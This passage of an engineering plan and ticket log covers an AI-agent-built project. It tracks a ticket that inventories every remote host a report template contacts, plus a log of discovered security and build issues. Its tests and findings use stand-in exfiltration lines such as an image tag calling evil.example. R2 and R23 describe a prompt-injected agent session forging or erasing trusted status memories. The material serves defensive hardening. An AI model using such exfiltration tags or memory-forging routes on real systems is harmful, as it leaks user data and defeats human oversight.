  - An absent session is `404 not_found`, never a `500`; a session with no artifacts renders an
    explicit empty state.
- **TDD:** yes for the routes and the theming assertion; no for layout.
- **Validation:**
  - `cd api && yarn test src/routes/artifacts src/orange/client && yarn typecheck` — confirm
    **2 test files**
  - `cd web && yarn test && yarn typecheck`
- **Depends on:** O12, W28, W14
- [ ] done
- Notes:

### W30: `remoteOrigins` — every host a template will contact   [Status: done | Model: opus]
- **Scope:** Report the full remote-host inventory W16's validator already computes and discards.
  Small, and three tickets depend on it.
- **Repo:** agent-wolf
- **Files:** modify `api/src/report/template.ts`, `api/src/report/template.test.ts`.
  🔴 **This edits W16's merged file** — W16 is done; `api/src/report/*`'s ownership row gains W30.
- **Acceptance criteria:**
  - `ParsedTemplate` gains **`remoteOrigins: string[]`**: the deduplicated, **sorted** set of
    `new URL(u).origin` for every URL the validator already visits — `src`, `href`, `srcset`,
    `poster`, `action`, `formaction`, `xlink:href`, `background`, `ping` (`template.ts:596`), plus
    CSS `url()` and `@import`. One push in an existing loop; **do not write a second walker**.
  - **`scriptSrcs` KEEPS ITS MEANING.** *(Reworded 2026-08-26: this bullet said "is unchanged" while
    the R118(2) bullet below requires a `srcdoc`-hosted `<script src>` to enter it, so the two
    contradicted on a literal read. Its contents may grow; its meaning may not.)* It means "remote code and stylesheets, which a human is
    approving as code" and W24 keeps listing it separately. `remoteOrigins` is the superset and
    answers a different question: everything this document will fetch.
  - A test proves the gap this closes: a template whose only remote URL is
    `<img src="https://evil.example/px.gif">` yields an **empty** `scriptSrcs` and a
    `remoteOrigins` of `["https://evil.example"]`. Without this, a human approves a template that
    phones home and the review screen shows them zero remote hosts.
  - Origins collapse: two URLs on the same host with different paths yield **one** entry; `https://a`
    and `https://a:443` are the same origin; ordering is deterministic.
  - A `data:` URL contributes **no** origin; a fragment-only `href="#chart"` **remains refused by the
    attribute path** per R118(3), and the CSS `#fragment` carve-out (`fill:url(#gradient)`) remains
    **accepted** and contributes no origin. *(Reworded 2026-08-26: as originally written this was
    unsatisfiable — R118(3), which this ticket must NOT fix, makes a template containing
    `href="#chart"` **invalid**, so it has no `remoteOrigins` to inspect at all. Both halves are
    pinned by test so W30 cannot drift R118(3) in either direction.)*
  - 🔴 **R118(2) IS FOLDED IN HERE — added 2026-08-24, moved from W21 by orchestrator decision.**
    W16's walker does **not** visit `iframe[srcdoc]`, `meta[http-equiv=refresh]` (the `URL=` part of
    its `content`) or `object > param[value]`, so a template can contact a remote host through any
    of the three and this ticket's inventory would not list it — which makes this ticket's own title
    false. **Add all three to the walker.** `srcdoc` holds a whole nested HTML document, so it means
    recursing `parseTemplate`'s walk into the srcdoc value and folding the nested document's origins
    into the parent's set; guard the recursion depth (2 is enough — assert the guard by test with a
    doubly-nested srcdoc) and count bytes against the same `maxBytes` budget so a nested document
    cannot be used to blow it. R118 originally assigned this to W21 because W21 owns the review
    *screen*; it moved here because **a screen can only show what the inventory holds**, and the
    criterion above forbids writing a second walker — so fixing it downstream would force exactly
    the thing this ticket prohibits. This is why the ticket is **opus**, not sonnet.
  - **State the direction each channel fails in, and test both.** A host missed here reaches W19 as
    a CSP that is too **narrow** — the browser blocks the fetch, so the report silently does not
    render (**fails closed**, safe but invisible). The same miss reaches W24's review screen as an
    **understatement** — the human approves a template that contacts a host they were never shown
    (**fails open**, and it is the reason R118 called this out). A test per channel asserts the
    origin now appears; a test asserts `scriptSrcs` is still **unchanged** by all three additions,
    because `scriptSrcs` means "remote code a human is approving as code" and a `srcdoc`-hosted
    `<script src>` **does** belong in it while an `<img>` in the same srcdoc does not.
  - 🔴 **R118(1) IS ALSO FOLDED IN — added 2026-08-26, same argument as R118(2).** The CSS URL
    scanner does not match **`image-set()`**, so
    `<style>.a{background:image-set("https://is.example/x.png" 1x)}</style>` parses valid with an
    **empty** `remoteOrigins` — verified. Add the alternative to `cssUrls`. It is one alternative in
    an existing scanner, not a second walker.
  - **`R118(3)` is NOT in scope** — the fragment-anchor disagreement between the attribute path and
    the CSS path stays with W25's authoring contract. Do not fix it here; do not break it either.
- **TDD:** yes.
- **Validation:** `cd api && yarn test src/report/template && yarn typecheck` — confirm **1 test
  file**, and that the pre-existing `template.test.ts` cases still pass unchanged.
- **Depends on:** W16 *(done)*
- [x] done — verified 2026-08-26 across **three** verifier passes, two fix rounds. Merged to agent-wolf `main` as `0d3f728`; main gated green after (api **32 files / 1099 tests**, 0 skipped, typecheck clean, zero pre-existing `template.test.ts` assertions edited across all three commits).
- Notes: Implemented `9b8dfd0`, fix rounds `ae09835` and `4ce514c`. 🔴 **Its verifier FAILED the first cut on a real fail-open hole — see R146.** After the fix it ran a second pass of **75 mutations** (74 on the first), probing the refresh grammar with **49 spellings** past both parties' lists, and found no under-acceptance left; reverting the fix reddens **8 independent assertions**. **R118(1) and R118(2) were both folded into this ticket** by orchestrator decision — the argument is the same for each: a review screen can only show what the inventory holds, and this ticket's own criterion forbids a second walker, so fixing either downstream would force exactly what it prohibits. Two of its criteria were **self-contradictory or unsatisfiable as written** and the implementer graded rather than faked them; the verifier confirmed both readings and the ticket text was amended (see the two *(Reworded 2026-08-26)* notes above). Judgement calls upheld on independent check: a `srcdoc`-hosted `<script src>` enters `scriptSrcs` (mandated by the ticket three bullets below the line it appears to contradict); exceeding the srcdoc depth limit is a validation **error**, not a silent stop; URL rules recurse while structural rules do not; `object > param` is read as a **descendant**; and the `ping` whitespace split — which the verifier explicitly said **not** to revert, since unsplit both hosts go unlisted. **The implementer logged 26 guesses and withdrew one of its own findings** (`<base href>` was already handled — `href` is in `URL_ATTRIBUTES`). 🔴 **Three redundant guards in one file produced R148, the wave's most generalisable finding.**

## Dependency graph

46 tickets. Verified acyclic on 2026-08-21 and re-verified on 2026-08-24 after revision 5
added O12, W27, W28, W29 and W30; every `Depends on` line resolves to a real ticket and no ticket
depends on itself transitively.

```
wave  1   O1  O4  O7  W1          ← O1, O7 done; W1 at 19/22
wave  2   O2  O11 W2  W3  W6
wave  3   O3  W4  W7
wave  4   O5  O6a O8  W5  W12
wave  5   O6b W8  W15
wave  6   O9  W9  W16 W18
wave  7   O10 W10 W17 W20
wave  8   W11 W25 W30              ← W30 is new (revision 5); W19 now needs it
wave  9   O12 W19 W21               ← O12 has no dependencies and may start any time
wave 10   W28 W22                   ← W28 needs O12; W27 needs W22
wave 11   W13 W27
wave 12   W14
wave 13   W23 X1
wave 14   W24 W29
wave 15   W26
```

**Revision 5's UI order is `O12 → W28 → W13 → W14 → W27/W29 → W23 → W24`.** W28 must land before
W13: it owns the theme and the two trust components, and the whole point of it running first is that
four UI tickets consume one vocabulary rather than each inventing one. O12 depends on nothing and is
the natural thing to start with.

A wave is what the graph *permits* to run together, not what must. § "Parallelism and file
ownership" is the binding constraint on top of it: two tickets in the same wave that share a file
still run serially. In wave 4, for example, O5 and O6a are independent, but O5 → O6b → O8 all touch
`go/cmd/agentd/main.go` and are strictly ordered.

The report layer (W15–W26) enters at wave 5 and runs alongside the product tickets rather than
after them, because W15's store reads are what W21's frame route needs.

⚠️ **X1 is at wave 13, not last.** It depends on **W22**, because X1 goes live and the
"a template must exist" gate is W22's — **corrected in revision 5, R128**: go-live has never
required a template in W9's code, and the requirement now lands in W22 beside `spec_validation`.
W22 depends on W21, so the `report-template` route is still transitively covered. W26 — the report layer's
own end-to-end — is last, at wave 13.

## Discovered Issues Log

### Revision 5 — the UI design (2026-08-24)

Six entries from the UI design pass. The design itself is
`design/2026-08-24-agent-wolf-ui.md`; these record what changed **in this document** and why.

| # | Entry |
| --- | --- |
| **R125** | **THE PLAN'S "IFRAME-ONLY UI REUSE" DECISION WAS WRONG, AND A PROBE PROVED IT.** The decision recorded `web/` as "not installable"; that was a **packaging** fact, not an architectural one. `web/package.json` already declared `peerDependencies`, `main: dist/index.js` and `types: dist/index.d.ts`; the blockers were `"private": true`, one `"noEmit": true` line, and five runtime deps misfiled under `devDependencies`. **45 of 53 components take props and nothing else** — only `AgentChat`, `AgentSessionList`, `ArtifactViewer`, `ArtifactPreviewDialog`, `InlineArtifactPreview`, `WorkersPage`, `WorkerChatPanel` and `ProjectSettingsPage` touch context or `fetch`. Proved end to end on 2026-08-24: built `dist` (112 modules, zero errors), packed a 364KB tarball, installed it into a throwaway React 18.3.1 / MUI 6 / vitest app sharing no code with Orange, and rendered `ArtifactPanel` — **whose `live` status dot computed to `rgb(0, 229, 160)`, the *consumer's* `success.main`.** That assertion is the whole argument for tiered reuse and is the thing an iframe can never do. `AgentMarkdown` also escaped `<img onerror>` and `<script>` while keeping the prose, which is what makes it safe for untrusted research notes. **Three findings the probe produced that reading would not have:** (1) 🔴 a consumer **must** set `test.server.deps.inline: [/@mui/, /@agentkit/]` or every import dies with `Directory import '.../@mui/material/utils' is not supported` — an error pointing at **MUI's own ESM build**, which an executor would reasonably read as the package being broken (→ W28); (2) 🟡 the barrel export makes the tier line **notional** — importing `ArtifactPanel` pulls `AgentChat`, costing 37–45s of resolution for one test file, so O12 needs subpath exports; (3) 🟢 Orange's 11 `@mui/material/styles` imports do **not** need changing — isolated by rebuilding unpatched and still passing 4/4, which made O12 smaller than it was first written. **This is the R120 discipline applied before the ticket was authored rather than after: a package that typechecks and emits is not a package that works.** |
| **R126** | **The UI was specified in detail and never designed, and four tickets were each inventing a trust vocabulary.** W13, W14, W23 and W24 pinned components, routes, shapes and tests, but nothing anywhere stated a screen flow, an information architecture, or a visual direction. Ten distinct "do not fully trust this" signals were scattered across them with four unrelated treatments — an `Alert severity="error"`, "a different colour treatment", "a hatched region", "a visible notice". The design's § 2 resolves them onto **two independent channels**: provenance (who wrote it; always on; **never alarming**) and severity (how much to trust it now; mostly absent; escalating). Conflating them is the trap — style model-authored content as a warning and the daily research notes, the normal useful output, look permanently broken while a real tamper alert loses all its force. W28 now owns the vocabulary and **runs before W13** so the four tickets consume one rather than inventing four. This is the same failure R116 records, spread across a UI instead of a spec. |
| **R127** | **The board's sort key barely moves, so a hypothesis going wrong without tripping was invisible.** `readBoard` sorts by `updatedAtMs` descending (`store.ts:1228`), `updatedAtMs` comes from the trusted **state** row, and a same-state transition "returns success and appends nothing" — so a daily tick never touches it. On day 30 the board was frozen in go-live order with no notion of attention beyond `challenged`. Owner decision 2026-08-24: the board becomes an **attention queue**. The cheap part is that most of it already exists and is thrown away — W10's poller appends ` attention=<n>` to line 1 of the evaluation memory (`store.ts:583`) and `parseEvaluationSummaryLine` tokenises the whole line into `found`, requires five keys, and returns only those five (`store.ts:466-483`), dropping it on the floor. Surfacing it is one optional field and one `found.get`. `stale=<n>` joins by the same mechanism, for W10's own stated reason: the memory is written only when line 1 changes, so a signal not on line 1 has its own write suppressed. → **W27**. |
| **R128** | **R45 was a wording defect, not a cycle, and it closes in W22.** The report-layer amendment says go-live refuses a hypothesis with no `report-template` while W21 is the only writer of one. Checked against the code: **go-live has never required a template** — W9 shipped without it — and the graph has no cycle either, since W24 → W23 → W22 → W21 means the writer exists before the gate does. The requirement moves to **W22**, and the gate goes where the plan already puts its other half: W13's criterion states the go-live gate has *exactly one server-side source*, and the pinned report block already carries `has_template` as its first field. `GET /api/hypotheses/:id` now answers both halves; W22 adds the `422` backstop for the race. **W9 is not reopened.** |
| **R129** | **R116's two accepted gaps close by DERIVING the CSP from the approved template, and 90% of the mechanism already existed.** `script-src https:` and `img-src https:` permitted any HTTPS host on earth, and W16 reports only `script[src]`, `link[rel=stylesheet][href]` and CSS `@import` — so a template exfiltrating through `<img src="https://evil.example/?d=…">` was approved by a human who **never saw that host**. But W16's validator already walks every URL channel (`src href srcset poster action formaction xlink:href background ping` plus CSS `url()`/`@import`, `template.ts:596,895`) and requires each to be `https:`; the inventory is computed and discarded. **W30** reports it as `remoteOrigins`, **W24** shows it to the approving human, and **W21/W19** substitute it into the policy — a template referencing nothing remote now yields `script-src 'unsafe-inline'` with no host at all, strictly tighter than before. `structureHash` already freezes the template, so the origin set is frozen with it: a new origin means a new human review, which is the property `https:` never had. W19's criterion changes from a whole string literal to a skeleton with four substitution points, still asserted exactly. **What does not close:** `'unsafe-inline'` stays (inline chart code; a nonce must vary per response while `structureHash` freezes the body) and is now the only breadth left in the policy; and a permitted origin can still receive an exfiltrating request — the bound moved from "every HTTPS host" to "the hosts a human approved for this template", which is a bound, not a guarantee. |
| **R130** | **Two documentation defects found while folding, both of the R116 class — a reference that resolves to the wrong thing.** (1) 🔴 `design/2026-08-21-agent-wolf-report-layer.md:370,426` still carries **pre-R116 copies** of § "The slot sanitiser profile, pinned as an ALLOW list" and § "The CSP header, byte-for-byte", and the companion's CSP is a **different string** — fewer directives, and `script-src https: 'unsafe-inline'` rather than `script-src 'unsafe-inline' https:`. W17 and W19 are told to copy those sections byte-for-byte **without being told which document**, so an executor who greps the design directory finds two answers. The companion's copies must be marked superseded before W17 or W19 is cut. (2) `api/src/routes/hypotheses.ts` appears **twice** in § "Parallelism and file ownership" with identical contents — harmless today, but the second copy is exactly the sort of row a later edit updates alone. Both rows were updated together in revision 5; the duplicate should be deleted. |
| **R131** | ✅ **DIAGNOSED AND SOLVED 2026-08-24 — THE REPORTS WERE NEVER LOST, ONLY UNDELIVERED.** In wave 8 all three spawned agents went idle without their final report reaching the orchestrator, which also happened to the `pinned-sections-review` agent on 2026-08-22 and was recorded then as "produced no report". **That reading was wrong.** Every one of those agents *had* written its full report — they sit in the session's own subagent transcripts at `~/.claude/projects/<project>/<session-id>/subagents/agent-a<name>-<hash>.jsonl`, 11K–23K characters each, including the 13,872-character review previously believed never to exist. Only the **delivery** failed: an `idle_notification` arrived where the tool result should have. 🔴 **THE RECOVERY PROCEDURE, for any future wave:** when an agent goes idle without reporting, do NOT re-run it and do NOT assume the work is unfinished — first check its worktree (in every wave-8 case the code was committed, correct, and the tree clean), then extract the **last assistant text message** from its transcript with a streaming JSON reader. **Never `Read` those files whole — they are megabytes and will overflow context.** What this cost before it was understood: the orchestrator hand-verified both tickets, reaching the same PASS verdicts but **measurably less thoroughly** — 9 mutations against W11 where the verifier ran **24**, and missing the one hole the verifier found (**R133**). The lesson is the inverse of the one first recorded here: the subagent pattern was working *better* than hand-verification, and the only real defect was a silent delivery channel. Keep the pattern; read the transcripts. |
| **R132** | **`web/`'s `@types/node` was declared but never installed, and O12 is the first thing to notice.** Immediately after merging O12 into agent-orange `main`, `npm run typecheck` in `web/` failed with `TS2307: Cannot find module 'node:path'` from `src/pure.test.ts` — while the *same commit* had typechecked clean in its worktree. Cause: `web/package.json` has carried `"@types/node": "^20.14.10"` in `devDependencies` all along, but `main`'s `web/node_modules` did not actually contain it, and nothing had ever imported a node builtin, so nothing failed. O12's `pure.test.ts` uses `node:path` and `node:url` to check the tier line on emitted files, which surfaces the gap. **`npm ci` in `web/` fixes it and is required after pulling O12** — the package-lock changed by 268 lines. **This is a latent condition O12 revealed, not one it created**, and it is worth remembering as a general shape: a green typecheck against a stale `node_modules` proves less than it appears to. |
| **R133** | 🔴 **NOTHING IN 1018 TESTS NOTICED IF `app.ts` NEVER MOUNTED EITHER W11 ROUTER — and the obvious fix would have been a test that only LOOKS like a guard.** W11's verifier deleted both `app.use` lines and the full suite stayed green: every case in `embed.test.ts` and `series.test.ts` builds its own bare `express()` app and never exercises `createApp`. In production both routes would 404 and the failure would first surface in W13, in a browser. There is an exact precedent in the very file W11 modified — `api/src/app.test.ts:68-92`, whose comment reads *"X1 fails without these two lines in createApp, and the failure would first surface nine tickets later."* **The trap:** the natural assertion, "signed out is 401 not 404", does **not** discriminate. W8 mounts a **path-prefixed** `router.use("/api/hypotheses", requireSignedIn)` (`routes/hypotheses.ts:396`), so every path under that prefix 401s whether or not W11's routers are mounted — proved by writing that test first and watching it stay green under the unmount. **The working discriminator is a signed-in probe with a malformed id:** W11's `requireHypothesisId` answers **400 `invalid` before any upstream call**, so it needs no `MockAgent` and touches no network, while an unmounted route falls through to 404. Closed on agent-wolf `main` as `b14191a`; both cases proved load-bearing by re-running the unmount and watching them go red (32 files / **1020 tests**). **The general shape outlives the fix:** a test whose assertion is also true when the thing under test is absent is not a test, and only mutation reveals it. |
| **R134** | 🔴 **THE VENDORED TARBALL MUST GET A NEW VERSION ON EVERY REPUBLISH — and this entry has now been wrong twice, in opposite directions, which is itself the finding.** Under **yarn 1** (what `agent-wolf` uses at its workspace root), replacing a `file:` tarball with different bytes at the **same version** does not reliably update the installed package. *Draft 1* of this entry transcribed O12's report — "a clean install dies with `error Integrity check failed`" — **without executing it**. *Draft 2* replaced that with the orchestrator's own repro claiming the CI path (`rm -rf node_modules && yarn install --frozen-lockfile`) silently serves stale code. **Both drafts are withdrawn.** W28's verifier ran the matrix in an isolated yarn cache and reproduced the opposite of draft 2: with the committed lockfile intact, its `resolved "file:…#<sha1>"` hash makes any tarball change fail **loudly**; silence arrives one step later, at the obvious "fix" — someone hits that integrity error, deletes the lockfile entry, reinstalls, and yarn then matches by `name-version`, serves the stale copy, exits 0 and **writes the stale hash into the fresh lockfile**. The orchestrator's own repro could not be trusted either way: it was contaminated (a second probe installed a *different* package's contents under the requested name) because it did **not** isolate the yarn cache the way the verifier's did. **What survives all of it, and is the only thing an executor needs:** a same-version republish is unsafe by at least one path and possibly several, **bumping the version is the only mechanism that works**, and it is a W28 criterion enforced by `web/src/theme.test.ts`, which asserts the dependency range, the committed filename and the **installed** package's version all agree. **The lesson, its ninth instance and the sharpest yet: when the orchestrator promotes an agent's testimony into a pinned claim it must execute it — and when it does execute it, it must isolate the environment first, or it manufactures a third wrong answer.** Also from O12: never use the directory form `"file:../../web"` — yarn 1 raw-copies the whole directory **including `web/node_modules`**, giving the consumer a second React, and both `files` and `.npmignore` are ignored. `examples/web` instead uses a Vite alias onto `web/dist/index.js` with **one entry per subpath** (alias keys match exactly, so a bare key misses `/pure`). O12 fixed the version at **`0.1.0`**, so W28's filename is `agentkit-chat-ui-0.1.0.tgz`. |
| **R135** | **A yarn-1 workspace hazard nobody had recorded: `@testing-library/jest-dom` hoists to the repo root while `vitest` stays nested, so the documented setup line does not work.** In `agent-wolf`'s workspace, jest-dom lands in `<repo>/node_modules` while vitest stays in `web/node_modules` (because `api/` has its own copy), so the one-liner every guide gives — `import "@testing-library/jest-dom/vitest"` — dies with `Cannot find package 'vitest' imported from <repo>/node_modules/@testing-library/jest-dom/dist/vitest.mjs`. W28 works around it in **`web/src/setupTests.ts`**, extending the matchers by hand and restating the `declare module "vitest"` augmentation locally (which must be `Assertion<T = any>`, or `TS2428`). **W13, W23 and W24 would each have hit this cold on their first component test.** The file is on no ownership row and must go on one. Related: W28 pinned `@testing-library/jest-dom` to exactly **`6.9.1`**, not `^6.9.1` — the caret resolves to 6.10.0, which yarn rejects for requiring Node ≥22 — and added **`@testing-library/dom@^10.4.1`**, a third package neither the ticket nor § "Pinned technology choices" names but which RTL 16 makes a peer. |
| **R136** | ✅ **FIXED 2026-08-24 — AND THE ORIGINAL DIAGNOSIS WAS WRONG, HELD BY THREE PARTIES AT ONCE.** The symptom was real and measured: a `web` suite that touched `@agentkit/chat-ui` took **~37s of pure module import**, against **1.4s** for the files that did not. R125 predicted it, W28's verifier measured it precisely, and both — and the orchestrator, who wrote it up — blamed **`@agentkit/chat-ui`'s `./components` barrel** (46 re-exports, and the `exports` map hard-blocked a deep import, so a consumer could not opt out). A `"./components/*"` wildcard export was added to `agent-orange/web/package.json` and Wolf switched to the deep subpath. **It changed nothing: still 40s.** That failure is what exposed the real cause. Timed in isolation: `import PushPin from "@mui/icons-material/PushPin"` → **506ms**; `import { PushPin } from "@mui/icons-material"` → **35.93s**. **`@mui/icons-material`'s barrel is 10,617 modules**, and seven of Orange's own components imported it while eleven others already deep-imported. O13 made all seven consistent — 27 icons converted, `web/src` only, no behaviour change, Orange's 1395 tests still green, `verify-package.sh` still passing, `examples/web` still building. **Result: Wolf's `web` suite 42.93s → 1.18s; the one file importing the package 37.76s → 1.26s, a 30× improvement** that every UI ticket now inherits instead of paying. The wildcard export was **kept** — it is correct on its own terms (the deep path pulls 1 module rather than 46) and it is what a consumer should use, but note that a deep subpath yields the module's **own** export shape, so `import ArtifactPanel from ".../components/ArtifactPanel"` is a **default** import; the barrel is what renames them into named exports, and getting it wrong is a typecheck error rather than a runtime surprise. Shipped as **0.1.2**, two version bumps in one sitting, which exercised R134's republish procedure for real. **The lesson: a correctly measured symptom with a confidently reasoned cause is still a guess. The fix that "obviously" follows is the cheapest possible test of the diagnosis — and when it changes nothing, that is data, not a setback.** |


Seeded from an adversarial review of revision 1 (2026-08-20, Fable at xhigh effort). Every entry
below was independently verified against the repo before revision 2 was written. Executors append
new entries here; do not edit existing ones.

| # | Finding | Where it landed in revision 2 |
| --- | --- | --- |
| **R1** | **Wolf cannot write memories.** `go/httpapi/httpapi.go:84` "Read-only by design"; `memories.go:43` "there is no POST counterpart". Revision 1's entire hypothesis store was built on a route that does not exist. | New ticket **O7**; `MemoryStore` gains `CreateMemory`; § "The trust model" |
| **R2** | **"Human decides" was enforced by nothing.** Memory is an open bus with no origin check; any session — including one that read a prompt-injected web page — could append `status=confirmed`. | § "The trust model"; W5's provenance rule; X1's `tamper-resistance` spec |
| **R3** | **Invalidation conditions were prose.** `"drawdown_pct > 25 sustained 30d"` had no parser, no evaluator and no ticket. The only possible reader was the researcher model judging its own trial. | § "Condition semantics"; new ticket **W4**; W3's typed schema |
| **R4** | **`weight` was validated and then consumed by nothing.** | The support score, § "Condition semantics"; W4 |
| **R5** | **Nothing ever triggered `live → challenged`,** and `horizon_days` fired nothing. Orange cannot call Wolf. | New ticket **W10** |
| **R6** | **Session containers cannot reach wolf-api** on the ordinary compose network: `agentd` shares DinD's netns and nested containers resolve no compose DNS. | § "Local topology and networking"; W1's `network_mode`; W7's URL origin |
| **R7** | **`download_url` built on the public base would be unreachable** from a nested container. | O6 acceptance criterion + O9's in-container curl |
| **R8** | **The critic could silently redefine derived metrics,** splicing incomparable points into a series the conditions test. | `method` object required in the spec (W3); locked preamble vs mutable method body (W9, W12) |
| **R9** | **"Datasets are never torn down" contradicted the 30-version reaper** — the evidence behind a verdict would be reaped ~30 days later. | Evaluation snapshots embedded in trusted memories (W9, W10) |
| **R10** | **`replace-whole` had no shrink guard**: a truncated provider response would replace a year of data, and CAS cannot object because it is the same writer. | `row_count` column (O1); shrink guard (O6); O9 test |
| **R11** | **O2's validation could not prove O2's criteria** — the store is Postgres-only, so the non-Postgres run exercises nothing. | O2's validation now requires `AGENTKIT_TEST_POSTGRES_URL` |
| **R12** | **`TestMutationsAreLogged` was run against the wrong package** and passed vacuously; it lives in `go/agentdb/config_events_test.go:594`. The "exempt datasets if the sweep objects" contingency was dead code — the sweep classifies by noun. | O6's validation and its comment |
| **R13** | **`dataset_put`'s blob key was unspecified;** keying by attempted version lets two racers collide, and the CAS winner points at the loser's bytes. Orphan blobs after a crash were unreclaimable. | O6 (unique per attempt, delete-on-conflict); O3 (`ListOrphanBlobPaths`) |
| **R14** | **Metric slugs bounded at 63 would overflow the dataset name** (`<hyp-id>-<slug>`) and fail every tick forever. | W3 bounds slugs at 50 |
| **R15** | **"Retention as a project setting" was a hidden second ticket** — `ProjectSettings` is a typed struct needing its own migration and console surface. | O3 uses an env knob only |
| **R16** | **Teardown left a queued delivery** able to dispatch after the worker was deleted; and hypothesis state had no concurrency control. | W9 drains deliveries first; W5 serialises transitions per id |
| **R17** | **X1 could not "force a scheduled tick"** — no such route exists — and the mock-model scripts were unticketed. | `WOLF_SCHEDULE_CRON` (W9); mock scripts are X1 deliverables |
| **R18** | **The `download_url` bearer token DOES cross the model context**, transcripts and `worker.finished` subscribers, contradicting the headline claim as stated. | Caveat box in § "The dataset atom"; O6 tool description; O10 docs |
| **R19** | **Project-map, `frame-ancestors` and MCP-credential forwarding were unowned.** With any map configured and no `allowed_origins` entry, Wolf's iframe is blocked outright. Compose forwards only variables it names by line. | O8 |
| **R20** | **The owner-slug mapping handled only `@`** (`kai+test@gmail.com` produces an illegal label); `/auth/verify-google` 404s unless `GOOGLE_CLIENT_ID` is set on Orange; archive-and-relaunch was a free scoreboard re-roll. | W5's total mapping; W8's config error; `restated_from` label |
| **R21** | **Wolf cannot raise an attention request.** `request_human_attention` is an MCP tool callable only from inside a container; over HTTP attention is read-only (`GET /agent/attention-requests`, `go/httpapi/httpapi.go:319`). Revision 2's first draft of W10 assumed a callable path. *(Found during revision-2 self-review.)* | W10's notification criterion |
| **R22** | **W9 composed a prompt from a template W12 had not yet authored.** Missing dependency. *(Found during revision-2 self-review.)* | W9 now depends on W8 **and** W12 |

### Revision 3 — second adversarial review + executability audit (2026-08-20)

| # | Finding | Where it landed in revision 3 |
| --- | --- | --- |
| **R23** | **CRITICAL — retraction bypassed the entire trust model.** `notRetractedSQL` (`go/agentdb/memories.go:284-288`) hides a row if *any* memory carries `retracts=<its id>`, **without checking the retractor's provenance**, and it is applied to both paths Wolf reads (`:353`, `:407`). A prompt-injected session did not need to forge a status — it could erase the real one, and nothing would surface. Revision 2 defended only against forged *newer* rows. | § "The trust model" → "Retraction"; new ticket **O11**; W5's criteria and dependency; X1's `tamper-resistance` attack (b) |
| **R24** | **The "only O7 produces empty provenance" invariant was false.** `ApplyTopology` also writes provenance-free memory seeds (`go/agentdb/topology_apply.go`, `go/topology/topology_test.go:242-243`), reachable at `POST /agent/topologies/apply` by any API-class credential — including an embed token, which is not scope-confined off session routes. | Invariant restated: trusted = empty provenance **AND** Wolf's own label vocabulary **AND** a matching `hyp-<id>` session |
| **R25** | **`nowMs` was in W4's signature and in none of its rules.** Anchoring the sustained window on `t_last` means a feed that died mid-trip keeps tripping forever on ancient data, and the coverage floor cannot catch it. Two implementers would have shipped opposite products. | Window anchors on `nowMs`; `staleness_days` for the single-observation case; a mandatory fixture in W4 |
| **R26** | **`change_pct`/`drawdown_pct` were undefined for `R <= 0`.** The `R == 0` rule was written narrowly for `ratio_to`. FRED macro series go negative routinely — a negative reference silently inverts the comparison. | One rule for every dividing statistic; `indeterminate` with reason `non_positive_reference`; new `change_abs` statistic for zero-crossing series |
| **R27** | **Mixed-frequency `ratio_to` was permanently indeterminate.** A hard-coded 7-day lookback against a monthly FRED series resolves ~7 days in 30, which the coverage floor then rejects forever. | `ratio_lookback_days` required and validated; interviewer prompt guidance |
| **R28** | **O7's "session token → 403" was unachievable, and the embed-token discriminator was unnamed.** Session tokens use a separate secret and are rejected **401 at the middleware** by the `sid` lock (`go/cmd/agentd/auth.go:104-118`). Embed tokens *do* reach the handler. *(This also means `docs/19-embedding.md`'s hazard H12 is stale.)* | O7's criteria corrected; `Identity.SessionScope` named; O10 gains the doc fix |
| **R29** | **The one-request board could not carry `support_score`.** It is computed from datasets, the board read returns a 500-byte snippet with no content, a negative score is an illegal label value, and a 5-minute re-write would append ~14k memories a day. | § "Where the board's numbers come from": a `kind=evaluation` trusted memory with a parseable summary line, written only on change or every 20h; second `latest_per` call |
| **R30** | **W9's teardown asked for an operation Orange does not expose, in an order that could not terminate.** There is no delivery-cancel route, `DeliveryQuery` has no `worker` field, and draining before deleting the schedule is unbounded because the scheduler keeps minting deliveries. Tick sessions also had no owner. | W9 rewritten: schedule first, then bounded poll-and-wait, then worker, then session; client-side worker filter; tick-session sweep in W9 and W10 |
| **R31** | **O6 had no size cap and inherited an ignored exit code.** `execAndCollect` buffers exec output with no limit (`go/execenv/docker/client.go:238-240`) and the artifact path checks only `err != nil`, never `ExitCode` (`go/runner.go:2824-2827`) — so `cat missing.csv` would have stored an empty dataset. Several seams were also unnamed. | O6 gains `AGENTKIT_DATASET_MAX_BYTES`, a `wc -c` probe, `test -f` + exit-code checks, and an explicit seam list |
| **R32** | **Systematic executability gaps.** No HTTP framework, MCP implementation, mock style or chart library was named; "typed errors" were asserted with no shared module; no git conventions; and the dependency graph implied O2/O3 (one file) and O5/O7 (one file) could run in parallel. | § "Pinned technology choices"; § "Shared error taxonomy"; § "Parallelism and file ownership"; § "Git conventions"; `errors.ts` in W1 |

| **R33** | **O6 was one ticket doing three jobs** — three MCP tools, the Exec-pull pipeline, CAS orchestration, path hardening and blob-key uniqueness. An executability audit judged it 2–3 tickets of surface. *(Split before execution, 2026-08-20.)* | Split into **O6a** (the pull pipeline as a tested internal function) and **O6b** (the three tools on top of it) |

### Confirmed correct — do NOT "fix" these in a later revision

- **Teardown order** (schedule before worker) and its justification: verified at
  `scheduler.go:363-371`, `dispatch.go:246-248`, `scheduler.go:768-790`.
- **The ms-vs-seconds split.** `memories` uses `UnixMilli`, `agent_*` uses `Unix()`. Matching the
  nearest neighbour is right. Do not unify.
- **Iframe-only reuse.** `examples/web/vite.config.ts:21-38` confirms `web/` is not installable.
  Do not attempt to package it.
- **`latest_per` exists and does what is claimed** (`go/httpapi/memories.go:159`), and search
  results **do** carry provenance (`go/agentdb/memories.go:113-121`) — which is what makes the
  one-request board read compatible with the trust model.
- **Exec+cat is the only file seam** (`go/runner.go:2733-2736`, `go/execenv/execenv.go:54`).
- **Refetchable-replace vs derived-append is domain-correct.** Dividend re-adjustment and FRED
  restatement are real. A reviewer demanding append-only everywhere would be wrong.
- **`@daily` really is refused**; the `404`-parity, `501`-off-Postgres and `410`-gone vocabularies
  are the house style and are copied deliberately.
- **`POST /agent/session` does accept `worker`** (added 2026-08-08). `docs/19-embedding.md`'s line
  about HTTP-created sessions having no `worker` column refers to the column, not the request
  field — W8 is correct as written.
- **Datasets deliberately write no config event.** They are data, not configuration.
- **`BlobStore` has `Delete`** — the reaper is implementable with no new seam.
- **The DinD topology in § "Local topology" is verified sound.** A service on
  `network_mode: "container:<dind>"` binding `:8100` reaches agentd at `localhost:8099`, is
  reachable from nested containers at `172.17.0.1:8100`, and from wolf-web at `dind:8100`. No
  collision with `8099` or `2375`. Two caveats now stated in that section: the container name
